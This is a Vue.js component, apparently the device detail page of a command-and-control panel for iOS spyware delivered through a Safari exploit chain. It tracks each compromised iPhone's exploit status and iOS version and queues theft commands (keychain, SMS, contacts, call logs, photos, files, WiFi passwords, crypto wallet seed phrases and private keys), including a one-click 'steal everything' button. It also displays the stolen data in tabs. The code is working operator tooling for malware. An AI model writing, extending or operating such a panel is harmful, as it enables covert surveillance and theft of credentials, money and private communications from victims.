<template>
  <div class="device-detail-page">
    <div class="page-card" style="margin-bottom:16px;">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
        <div style="display:flex;align-items:center;gap:12px;">
          <el-button link type="primary" @click="goBack">
            <el-icon><ArrowLeft /></el-icon>
            <span>返回列表</span>
          </el-button>
          <el-divider direction="vertical" />
          <div>
            <h3 style="margin:0;font-size:18px;">设备详情</h3>
            <span class="mono text-muted">{{ device?.device_uuid || uuid }}</span>
          </div>
        </div>
        <div>
          <el-tag v-if="isDeviceOnline" type="success" effect="dark">在线</el-tag>
          <el-tag v-else type="info" effect="plain">离线</el-tag>
        </div>
      </div>

      <el-row :gutter="16">
        <el-col :span="8">
          <el-descriptions :column="1" border size="small" title="基础信息">
            <el-descriptions-item label="UUID"><span class="mono">{{ device?.device_uuid || '-' }}</span></el-descriptions-item>
            <el-descriptions-item label="系统">{{ formatOS }}</el-descriptions-item>
            <el-descriptions-item label="型号">{{ formatModel }}</el-descriptions-item>
            <el-descriptions-item label="芯片">{{ device?.chipset || '-' }}</el-descriptions-item>
            <el-descriptions-item label="硬件型号">
              <span class="mono text-muted">{{ device?.hw_model || '-' }}</span>
            </el-descriptions-item>
            <el-descriptions-item label="浏览器">
              <template v-if="device?.browser_name || device?.browser_version">
                <el-tag size="small" effect="plain" :type="browserTagType">
                  {{ device?.browser_name || '-' }}
                  <span v-if="device?.browser_version" style="margin-left:4px;opacity:.75;">v{{ device.browser_version }}</span>
                </el-tag>
              </template>
              <span v-else>-</span>
            </el-descriptions-item>
            <el-descriptions-item label="内核/WebKit 版本">{{ device?.webkit_version || '-' }}</el-descriptions-item>
            <el-descriptions-item label="Safari 版本">
              <template v-if="device?.browser_name === 'Safari' && device?.browser_version">
                {{ device.browser_version }}
              </template>
              <span v-else class="text-muted">{{ device?.safari_version || '-' }}</span>
            </el-descriptions-item>
            <el-descriptions-item label="越狱/Root">
              <el-tag :type="jailbrokenTag.type" size="small" effect="plain">
                {{ jailbrokenTag.text }}
              </el-tag>
            </el-descriptions-item>
          </el-descriptions>
        </el-col>
        <el-col :span="8">
          <el-descriptions :column="1" border size="small" title="连接信息">
            <el-descriptions-item label="IP 地址">
              <span class="mono">{{ device?.ip || '-' }}</span>
              <span v-if="device?.ip_location" style="margin-left:8px;color:#909399;font-size:12px;">
                {{ device.ip_location }}
              </span>
            </el-descriptions-item>
            <el-descriptions-item label="渠道">
              <template v-if="device?.channel_name">
                <el-tag size="small" effect="plain" :style="device?.channel_color ? { background: device.channel_color + '18', color: device.channel_color, borderColor: device.channel_color + '55' } : {}">
                  {{ device.channel_name }}
                </el-tag>
                <span v-if="device?.channel_slug" class="text-muted" style="margin-left:6px;font-size:12px;">({{ device.channel_slug }})</span>
              </template>
              <span v-else>-</span>
            </el-descriptions-item>
            <el-descriptions-item label="模板">
              <template v-if="device?.template_name">
                {{ device.template_name }}
                <span v-if="device?.template_slug" class="text-muted" style="margin-left:6px;font-size:12px;">({{ device.template_slug }})</span>
              </template>
              <span v-else>-</span>
            </el-descriptions-item>
            <el-descriptions-item label="分组">
              <template v-if="device?.group_name">
                <el-tag size="small" effect="plain" :style="device?.group_color ? { background: device.group_color + '18', color: device.group_color, borderColor: device.group_color + '55' } : {}">
                  {{ device.group_name }}
                </el-tag>
              </template>
              <span v-else>&lt;未分组&gt;</span>
            </el-descriptions-item>
            <el-descriptions-item label="利用状态">
              <el-tag :type="exploitTag.type" size="small" effect="plain">{{ exploitTag.text }}</el-tag>
            </el-descriptions-item>
            <el-descriptions-item label="兼容性">
              <el-tag :type="compatibleTag.type" size="small" effect="plain">{{ compatibleTag.text }}</el-tag>
            </el-descriptions-item>
          </el-descriptions>
        </el-col>
        <el-col :span="8">
          <el-descriptions :column="1" border size="small" title="时间信息">
            <el-descriptions-item label="首次上线">{{ formatDate(device?.first_seen) }}</el-descriptions-item>
            <el-descriptions-item label="最近心跳">{{ formatRelative(device?.last_seen) }}</el-descriptions-item>
            <el-descriptions-item label="最近命令">{{ device?.last_command_time ? formatRelative(device.last_command_time) : '-' }}</el-descriptions-item>
            <el-descriptions-item label="在线时长">{{ uptimeText }}</el-descriptions-item>
            <el-descriptions-item label="归属">
              <template v-if="device?.agent_id">代理 ID: {{ device.agent_id }}</template>
              <span v-else>管理员</span>
            </el-descriptions-item>
            <el-descriptions-item label="启用/禁用">
              <el-tag :type="(device?.enabled ?? 1) ? 'success' : 'danger'" size="small" effect="plain">
                {{ (device?.enabled ?? 1) ? '已启用' : '已禁用' }}
              </el-tag>
            </el-descriptions-item>
          </el-descriptions>
        </el-col>
      </el-row>

      <div v-if="device?.host || device?.access_path || device?.note || device?.user_agent" style="margin-top:16px;">
        <el-descriptions :column="2" border size="small" title="访问上下文">
          <el-descriptions-item label="访问 Host" :span="2">
            <span class="mono">{{ device?.host || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item label="来源 Referer" :span="2">
            <span class="mono text-muted">{{ device?.referer || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item label="访问路径" :span="2">
            <span class="mono text-muted" style="word-break:break-all;">{{ device?.access_path || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item label="User-Agent" :span="2">
            <span class="mono text-muted" style="word-break:break-all;">{{ device?.user_agent || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item v-if="device?.note" label="备注" :span="2">
            {{ device.note }}
          </el-descriptions-item>
        </el-descriptions>
      </div>
    </div>

    <el-row :gutter="16">
      <el-col :span="8">
        <div class="page-card" style="height:100%;">
          <div class="page-header">
            <div class="page-title">心跳时间线</div>
          </div>
          <el-timeline>
            <el-timeline-item
              v-for="(h, idx) in heartbeats"
              :key="idx"
              :timestamp="formatRelative(h.created_at || h.time)"
              :type="h.status === 'online' || h.online ? 'success' : 'info'"
            >
              <div>
                <strong>{{ (h.status === 'online' || h.online) ? '心跳' : '离线' }}</strong>
                <div v-if="h.source" class="text-muted" style="font-size:11px;margin-top:2px;">来源: {{ h.source }}</div>
                <div class="text-muted" style="font-size:12px;margin-top:2px;">
                  IP: {{ h.ip || '-' }} · 电池: {{ h.battery != null ? h.battery + '%' : '-' }}
                </div>
              </div>
            </el-timeline-item>
          </el-timeline>
        </div>
      </el-col>
      <el-col :span="16">
        <div class="page-card">
          <div class="page-header">
            <div>
              <div class="page-title">命令发送</div>
              <div class="page-subtitle">发送控制命令到此设备</div>
            </div>
            <el-button type="warning" plain :disabled="commandsDisabled" @click="openRunScript">
              <el-icon><VideoPlay /></el-icon>
              <span>运行脚本</span>
            </el-button>
          </div>
          <el-alert
            v-if="commandBlockReason"
            style="margin-bottom:14px;"
            :title="commandBlockReason"
            :type="commandAlertType"
            show-icon
            :closable="false"
          />
          <div style="margin-bottom:12px;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
              <div style="font-size:12px;color:#909399;">快捷命令模板：</div>
              <el-button
                size="small"
                type="success"
                :loading="sendingAll"
                :disabled="commandsDisabled"
                @click="sendAllCmds"
                style="margin-left:10px;"
              >
                <el-icon><Promotion /></el-icon>
                <span>一键执行全部窃取</span>
              </el-button>
            </div>
            <div style="display:flex;flex-wrap:wrap;gap:6px;">
              <el-tag
                v-for="t in cmdTemplates"
                :key="t.cmd"
                size="small"
                effect="plain"
                :style="commandsDisabled ? 'opacity:.55;cursor:not-allowed;' : 'cursor:pointer;'"
                @click="onTemplateClick(t.cmd)"
              >
                {{ t.label }}
              </el-tag>
            </div>
            <div style="font-size:11px;color:#c0c4cc;margin-top:6px;">
              提示：点击模板只是填入命令，还需点【发送命令】才会下发（或直接点【一键执行全部窃取】）
            </div>
          </div>
          <el-input
            v-model="cmdText"
            type="textarea"
            :rows="3"
            :disabled="commandsDisabled"
            placeholder="输入要执行的命令，例如：ds_exfil_keychain  或  ds_alert Hello~  或  ds_vibrate"
          />
          <div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end;">
            <el-button :disabled="commandsDisabled" @click="cmdText = ''">清空</el-button>
            <el-button type="primary" :loading="sendingCmd" :disabled="commandsDisabled" @click="sendCmd">
              <el-icon><Promotion /></el-icon>
              <span>发送命令</span>
            </el-button>
          </div>
        </div>

        <div class="page-card" style="margin-top:16px;">
          <div class="page-header">
            <div class="page-title">窃取数据</div>
          </div>
          <el-tabs v-model="activeTab">
            <el-tab-pane label="沙箱数据" name="sandbox">
              <el-alert v-if="!tabsData.sandbox?.length" type="info" show-icon :closable="false"
                title="暂无沙箱采集数据（Stage2成功后会自动上报）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.sandbox" :cols="sandboxCols" />
            </el-tab-pane>
            <el-tab-pane label="Keychain" name="keychain">
              <el-alert v-if="!tabsData.keychain?.length" type="info" show-icon :closable="false"
                title="暂无 Keychain 数据。请下发命令：ds_exfil_keychain（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.keychain" :cols="keychainCols" />
            </el-tab-pane>
            <el-tab-pane label="WiFi" name="wifi">
              <el-alert v-if="!tabsData.wifi?.length" type="info" show-icon :closable="false"
                title="暂无 WiFi 数据。请下发命令：ds_exfil_wifi（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.wifi" :cols="wifiCols" />
            </el-tab-pane>
            <el-tab-pane label="通讯录" name="contacts">
              <el-alert v-if="!tabsData.contacts?.length" type="info" show-icon :closable="false"
                title="暂无通讯录数据。请下发命令：ds_exfil_contacts（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.contacts" :cols="contactCols" />
            </el-tab-pane>
            <el-tab-pane label="短信" name="sms">
              <el-alert v-if="!tabsData.sms?.length" type="info" show-icon :closable="false"
                title="暂无短信数据。请下发命令：ds_exfil_sms（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.sms" :cols="smsCols" />
            </el-tab-pane>
            <el-tab-pane label="通话" name="calls">
              <el-alert v-if="!tabsData.calls?.length" type="info" show-icon :closable="false"
                title="暂无通话记录数据。请下发命令：ds_exfil_calls（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.calls" :cols="callCols" />
            </el-tab-pane>
            <el-tab-pane label="照片" name="photos">
              <el-alert v-if="!validPhotos.length" type="info" show-icon :closable="false"
                title="暂无照片数据。请下发命令：ds_exfil_photos（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <div v-if="validPhotos.length" style="display:grid;grid-template-columns:repeat(6,1fr);gap:8px;">
                <div v-for="p in validPhotos" :key="p.id" style="aspect-ratio:1;overflow:hidden;border-radius:6px;background:#f5f5f5;">
                  <img v-if="p.thumb" :src="p.thumb" style="width:100%;height:100%;object-fit:cover;" />
                </div>
              </div>
              <el-empty v-else description="暂无照片" style="padding:24px 0;" />
            </el-tab-pane>
            <el-tab-pane label="文件" name="files">
              <el-alert v-if="!tabsData.files?.length" type="info" show-icon :closable="false"
                title="暂无文件数据。请下发命令：ds_exfil_files / ds_file_ls（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.files" :cols="fileCols" />
            </el-tab-pane>
            <el-tab-pane label="钱包" name="wallet">
              <el-alert v-if="!tabsData.wallet?.length" type="info" show-icon :closable="false"
                title="暂无钱包数据。请下发命令：ds_exfil_wallet（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.wallet" :cols="walletCols" />
            </el-tab-pane>
          </el-tabs>
        </div>
      </el-col>
    </el-row>

    <el-dialog v-model="scriptDialogVisible" title="选择脚本运行" width="640px" top="10vh">
      <div style="margin-bottom:10px;color:#909399;font-size:13px;">
        设备：<span class="mono">{{ uuid }}</span>
      </div>
      <el-alert
        v-if="commandBlockReason"
        style="margin-bottom:12px;"
        :title="commandBlockReason"
        :type="commandAlertType"
        show-icon
        :closable="false"
      />
      <el-table
        :data="scriptsList"
        stripe
        max-height="420"
        v-loading="scriptsLoading"
        @selection-change="(sel) => selectedScriptId = sel.length ? sel[0].id : null"
        ref="scriptTableRef"
      >
        <el-table-column type="radio" width="45" />
        <el-table-column prop="name" label="脚本名称" width="160" show-overflow-tooltip />
        <el-table-column prop="category" label="分类" width="90">
          <template #default="{ row }">
            <el-tag size="small" effect="plain" v-if="row.category">{{ row.category }}</el-tag>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="description" label="说明" show-overflow-tooltip>
          <template #default="{ row }">
            <span v-if="row.description">{{ row.description }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="use_count" label="运行次数" width="80" align="right">
          <template #default="{ row }">{{ row.use_count || 0 }}</template>
        </el-table-column>
      </el-table>
      <template #footer>
        <el-button @click="scriptDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="scriptRunning" :disabled="commandsDisabled || !selectedScriptId" @click="confirmRunScript">
          运行到此设备
        </el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, defineComponent, h } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import { ArrowLeft, Promotion, VideoPlay } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, formatRelative, require2FA } from '../utils/twofa'

const route = useRoute()
const router = useRouter()
const uuid = route.params.uuid
const device = ref(null)
const heartbeats = ref([])
const activeTab = ref('sandbox')
const cmdText = ref('')
const sendingCmd = ref(false)
const sendingAll = ref(false)
const scriptDialogVisible = ref(false)
const scriptsLoading = ref(false)
const scriptsList = ref([])
const selectedScriptId = ref(null)
const scriptRunning = ref(false)

const validPhotos = computed(() =>
  Array.isArray(tabsData.value?.photos)
    ? tabsData.value.photos.filter(p => p && (typeof p.id !== 'undefined'))
    : []
)

const isDeviceOnline = computed(() => {
  const s = String(device.value?.status || '').toLowerCase()
  return s === 'online' || s === 'active'
})

const formatOS = computed(() => {
  if (!device.value) return '-'
  const ver = device.value.os_version
  if (!ver) return '-'
  const model = device.value.device_model || device.value.hw_model || ''
  const hasIosInModel = /ios|iphone|ipad|ipod/i.test(model)
  const prefix = hasIosInModel ? '' : (model ? 'iOS ' : 'iOS ')
  return prefix + ver
})

const formatModel = computed(() => {
  if (!device.value) return '-'
  const primary = device.value.device_model
  const hw = device.value.hw_model
  if (primary && hw && primary !== hw) return `${primary} (${hw})`
  return primary || hw || '-'
})

const jailbrokenTag = computed(() => {
  const raw = (device.value?.jailbroken ?? '').toString().toLowerCase().trim()
  if (raw === 'yes' || raw === 'true' || raw === '1' || raw === 'jailbroken' || raw === '越狱') {
    return { type: 'danger', text: '已越狱' }
  }
  if (raw === 'no' || raw === 'false' || raw === '0' || raw === 'not_jailbroken' || raw === '未越狱' || raw === 'clean') {
    return { type: 'success', text: '未越狱' }
  }
  return { type: 'info', text: '未知' }
})

const exploitTag = computed(() => {
  const raw = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  switch (raw) {
    case 'success':
    case 'exploited':
    case 'complete':
    case 'ok':
      return { type: 'success', text: '已利用' }
    case 'pending':
    case 'in_progress':
    case 'running':
      return { type: 'warning', text: '待利用' }
    case 'failed':
    case 'error':
      return { type: 'danger', text: '利用失败' }
    case 'not_supported':
    case 'unsupported':
      return { type: 'info', text: '不支持' }
    default:
      if (!raw) return { type: 'info', text: '未检测' }
      return { type: 'warning', text: raw }
  }
})

const compatibleTag = computed(() => {
  const raw = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  switch (raw) {
    case 'compatible':
    case 'supported':
    case 'yes':
      return { type: 'success', text: '兼容' }
    case 'partial':
    case 'partially_compatible':
    case 'limited':
      return { type: 'warning', text: '部分兼容' }
    case 'incompatible':
    case 'unsupported':
    case 'no':
      return { type: 'danger', text: '不兼容' }
    case 'too_high':
      return { type: 'warning', text: '版本过高' }
    case 'too_low':
      return { type: 'danger', text: '版本过低' }
    default:
      if (!raw) return { type: 'info', text: '未知' }
      return { type: 'primary', text: raw }
  }
})

const browserTagType = computed(() => {
  const name = String(device.value?.browser_name ?? '').toLowerCase()
  if (!name) return 'info'
  if (name === 'safari') return 'success'
  if (['chrome', 'edge', 'firefox', 'opera', 'brave', 'duckduckgo'].includes(name)) return 'primary'
  if (['微信', 'qq'].includes(name) || /wechat|micromessenger/i.test(name)) return 'warning'
  return 'info'
})

const _BLOCKED_LEVELS = new Set(['too_low', 'too_high', 'incompatible', 'unsupported', 'no'])
const commandsDisabled = computed(() => {
  const cl = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  if (_BLOCKED_LEVELS.has(cl)) return true
  const es = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  if (es && es !== 'success') return true
  return false
})
const commandAlertType = computed(() => {
  const cl = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  if (cl === 'too_high') return 'warning'
  const es = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  if (es === 'pending') return 'warning'
  return 'error'
})
const commandBlockReason = computed(() => {
  const cl = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  const ver = device.value?.os_version || '未知'
  if (cl === 'too_low') {
    return `⚠️ 设备 iOS 版本（${ver}）过低，不支持命令下发。最低要求 iOS 13.0，建议使用 iOS 15.0 ~ 17.2 之间的 Safari 浏览器。`
  }
  if (cl === 'too_high') {
    return `⚠️ 设备 iOS 版本（${ver}）过高，当前漏洞利用链暂不支持，命令下发已禁止。最高支持 iOS 17.2。`
  }
  if (_BLOCKED_LEVELS.has(cl)) {
    return `⚠️ 设备不兼容（兼容级别：${cl}），命令下发已禁止。请使用 iOS 13.0 ~ 17.2 之间的 iPhone / iPad Safari 浏览器。`
  }
  const es = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  if (es === 'pending') {
    return '⚠️ 设备尚未完成漏洞利用（当前：待利用），命令下发会一直 pending 不执行。请先用 iPhone Safari 打开渠道落地页触发 exploit，待「利用状态」变为「已利用」后再下发命令。'
  }
  if (es === 'failed') {
    return '❌ 设备漏洞利用失败（exploit_status=failed），命令下发不会执行。请更换 iOS 版本或检查 Stage1/2/3 exploit 文件是否正确配置。'
  }
  if (es && es !== 'success') {
    return `⚠️ 设备利用状态异常（${es}），命令下发不会执行。需等待 exploit_status 变为 success。`
  }
  return ''
})

const uptimeText = computed(() => {
  if (!device.value?.first_seen) return '-'
  const first = new Date(device.value.first_seen).getTime()
  const lastRaw = device.value.last_seen ? new Date(device.value.last_seen).getTime() : Date.now()
  if (Number.isNaN(first) || Number.isNaN(lastRaw)) return '-'
  const diffMs = Math.max(0, lastRaw - first)
  const s = Math.floor(diffMs / 1000)
  const d = Math.floor(s / 86400)
  const h = Math.floor((s % 86400) / 3600)
  const m = Math.floor((s % 3600) / 60)
  const parts = []
  if (d > 0) parts.push(`${d} 天`)
  if (h > 0) parts.push(`${h} 小时`)
  if (parts.length === 0) parts.push(`${m} 分钟`)
  return parts.join(' ')
})

const cmdTemplates = [
  { label: '设备信息', cmd: 'ds_info' },
  { label: '获取位置', cmd: 'ds_location' },
  { label: '截屏', cmd: 'ds_screenshot' },
  { label: '窃取 Keychain', cmd: 'ds_exfil_keychain' },
  { label: '窃取通讯录', cmd: 'ds_exfil_contacts' },
  { label: '窃取短信', cmd: 'ds_exfil_sms' },
  { label: '窃取通话记录', cmd: 'ds_exfil_calls' },
  { label: '窃取 WiFi', cmd: 'ds_exfil_wifi' },
  { label: '窃取照片', cmd: 'ds_exfil_photos' },
  { label: '窃取钱包', cmd: 'ds_exfil_wallet' },
  { label: '🫨震动(iOS视觉)', cmd: 'ds_vibrate' },
  { label: '💬弹窗Alert', cmd: 'ds_alert Hello from Coruna!' }
]

const keychainCols = [
  { prop: 'service', label: '服务', width: 180 },
  { prop: 'account', label: '账号', width: 180 },
  { prop: 'password', label: '密码' },
  { prop: 'created_at', label: '同步时间', width: 160, type: 'date' }
]
const wifiCols = [
  { prop: 'ssid', label: 'SSID', width: 220 },
  { prop: 'password', label: '密码' },
  { prop: 'encryption', label: '加密方式', width: 120 }
]
const contactCols = [
  { prop: 'name', label: '姓名', width: 140 },
  { prop: 'phone', label: '电话' },
  { prop: 'email', label: '邮箱' }
]
const smsCols = [
  { prop: 'address', label: '对方号码', width: 160 },
  { prop: 'body', label: '内容' },
  { prop: 'type', label: '类型', width: 80 },
  { prop: 'date', label: '时间', width: 160, type: 'date' }
]
const callCols = [
  { prop: 'number', label: '号码', width: 160 },
  { prop: 'type', label: '类型', width: 100 },
  { prop: 'duration', label: '时长', width: 100 },
  { prop: 'date', label: '时间', width: 160, type: 'date' }
]
const fileCols = [
  { prop: 'name', label: '文件名' },
  { prop: 'path', label: '路径' },
  { prop: 'size', label: '大小', width: 100 },
  { prop: 'modified', label: '修改时间', width: 160, type: 'date' }
]
const walletCols = [
  { prop: 'type', label: '钱包类型', width: 140 },
  { prop: 'mnemonic', label: '助记词' },
  { prop: 'private_key', label: '私钥' }
]
const sandboxCols = [
  { prop: 'description', label: '项目', width: 160 },
  { prop: 'path', label: '数据路径' },
  { prop: 'file_size', label: '大小', width: 90 },
  { prop: 'uploaded_at', label: '采集时间', width: 170, type: 'date' },
  {
    prop: 'actions', label: '操作', width: 110, type: 'custom', _render: (scope) => {
      const row = scope?.row || {}
      const id = row.id
      if (!id) return null
      const token = localStorage.getItem('token') || ''
      const url = token
        ? `/api/exfil/${id}/download?token=${encodeURIComponent(token)}`
        : `/api/exfil/${id}/download`
      return h('a', {
        href: url,
        target: '_blank',
        class: 'el-link el-link--primary is-underline',
        style: 'cursor:pointer;'
      }, '下载')
    }
  }
]

const tabsData = ref({
  sandbox: [], keychain: [], wifi: [], contacts: [], sms: [], calls: [], photos: [], files: [], wallet: []
})

const dataTable = defineComponent({
  name: 'DataTable',
  props: { rows: { type: Array, default: () => [] }, cols: { type: Array, default: () => [] } },
  setup(props) {
    return () => {
      const rows = Array.isArray(props.rows) ? props.rows : []
      const cols = Array.isArray(props.cols) ? props.cols : []
      return h('div', {}, [
        h('el-table', {
          data: rows,
          stripe: true,
          size: 'small',
          style: { width: '100%' }
        },
          cols.map(col => {
            const colProps = { prop: col.prop, label: col.label }
            if (col.width != null) colProps.width = col.width
            if (col.type === 'date') {
              return h('el-table-column', colProps, {
                default: (scope) => {
                  const row = scope && scope.row ? scope.row : {}
                  const val = row[col.prop]
                  return h('span', { class: 'text-muted' }, val ? formatRelative(val) : '-')
                }
              })
            }
            if (typeof col._render === 'function') {
              return h('el-table-column', colProps, {
                default: (scope) => col._render(scope)
              })
            }
            return h('el-table-column', colProps)
          })
        ),
        rows.length === 0
          ? h('el-empty', { description: '暂无数据', style: { padding: '20px 0' } })
          : null
      ])
    }
  }
})

function goBack() {
  router.push('/devices')
}

async function loadDevice() {
  try {
    const res = await axios.get(`/api/devices/${uuid}`)
    device.value = res.data
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '设备信息加载失败'
    ElMessage.error(msg)
    device.value = { device_uuid: uuid, status: 'unknown' }
  }
}

async function loadHeartbeats() {
  try {
    const res = await axios.get(`/api/devices/${uuid}/heartbeats`)
    heartbeats.value = res.data?.items || res.data || []
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '心跳记录加载失败'
    ElMessage.error(msg)
    heartbeats.value = []
  }
}

async function loadTabs() {
  for (const tab of ['sandbox', 'keychain', 'wifi', 'contacts', 'sms', 'calls', 'files', 'wallet', 'wallets', 'photos', 'location', 'system_info']) {
    try {
      const res = await axios.get(`/api/exfil`, { params: { device_uuid: uuid, category: tab, limit: 20 } })
      tabsData.value[tab] = res.data?.items || res.data || []
    } catch (err) {
      const msg = err?.response?.data?.detail || err?.message || `${tab} 数据加载失败`
      ElMessage.error(msg)
      tabsData.value[tab] = []
    }
  }
}

function onTemplateClick(cmd) {
  if (commandsDisabled.value) {
    ElMessage.warning(commandBlockReason.value || '当前设备不兼容，命令下发已禁止')
    return
  }
  cmdText.value = cmd
}

async function sendCmd() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，命令下发已禁止')
    return
  }
  if (!cmdText.value.trim()) {
    ElMessage.warning('请输入命令')
    return
  }
  sendingCmd.value = true
  try {
    const otp = await require2FA('send command')
    const params = {}
    if (otp) params.otp_code = otp
    await axios.post('/api/commands', { device_uuid: uuid, command: cmdText.value.trim() }, { params })
    ElMessage.success('命令已发送，等待设备上线执行')
    cmdText.value = ''
    loadCommands()
  } catch (err) {
    const msg = err?.response?.data?.detail || '命令发送失败'
    ElMessage.error(msg)
  } finally {
    sendingCmd.value = false
  }
}

const AUTO_STEAL_CMDS = [
  'ds_info',
  'ds_location',
  'ds_screenshot',
  'ds_exfil_keychain',
  'ds_exfil_contacts',
  'ds_exfil_sms',
  'ds_exfil_calls',
  'ds_exfil_wifi',
  'ds_exfil_photos',
  'ds_exfil_wallet'
]

async function sendAllCmds() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，命令下发已禁止')
    return
  }
  if (sendingAll.value) return
  sendingAll.value = true
  let successCnt = 0
  let failCnt = 0
  try {
    const otp = await require2FA('send all commands')
    const params = {}
    if (otp) params.otp_code = otp
    for (let i = 0; i < AUTO_STEAL_CMDS.length; i++) {
      const cmd = AUTO_STEAL_CMDS[i]
      try {
        await axios.post('/api/commands', { device_uuid: uuid, command: cmd }, { params })
        successCnt++
      } catch (err) {
        failCnt++
      }
    }
    if (successCnt > 0) ElMessage.success(`批量下发成功：${successCnt} 条命令已加入待执行队列${failCnt ? `，失败 ${failCnt} 条` : ''}`)
    else ElMessage.error('批量下发全部失败，请检查日志')
    loadCommands()
  } catch (err) {
    const msg = err?.response?.data?.detail || '批量下发中断'
    ElMessage.error(msg)
  } finally {
    sendingAll.value = false
  }
}

async function loadScripts() {
  scriptsLoading.value = true
  try {
    const res = await axios.get('/api/commands/scripts', { params: { skip: 0, limit: 200 } })
    scriptsList.value = res.data?.items || res.data || []
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '脚本列表加载失败'
    ElMessage.error(msg)
    scriptsList.value = []
  } finally {
    scriptsLoading.value = false
  }
}

function openRunScript() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，脚本下发已禁止')
    return
  }
  selectedScriptId.value = null
  scriptDialogVisible.value = true
  loadScripts()
}

async function confirmRunScript() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，脚本下发已禁止')
    return
  }
  if (!selectedScriptId.value) {
    ElMessage.warning('请选择要运行的脚本')
    return
  }
  scriptRunning.value = true
  try {
    const otp = await require2FA('run script on device')
    if (otp === false) { scriptRunning.value = false; return }
    const params = {}
    if (otp) params.otp_code = otp
    const res = await axios.post(`/api/commands/scripts/${selectedScriptId.value}/run`, { targets: [uuid] }, { params })
    const n = typeof res.data?.devices === 'number' ? res.data.devices : 1
    ElMessage.success(`脚本已发送到 ${n} 台设备`)
    scriptDialogVisible.value = false
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '脚本发送失败'
      ElMessage.error(msg)
    }
  } finally {
    scriptRunning.value = false
  }
}

function loadCommands() {}

onMounted(() => {
  loadDevice()
  loadHeartbeats()
  loadTabs()
})
</script>
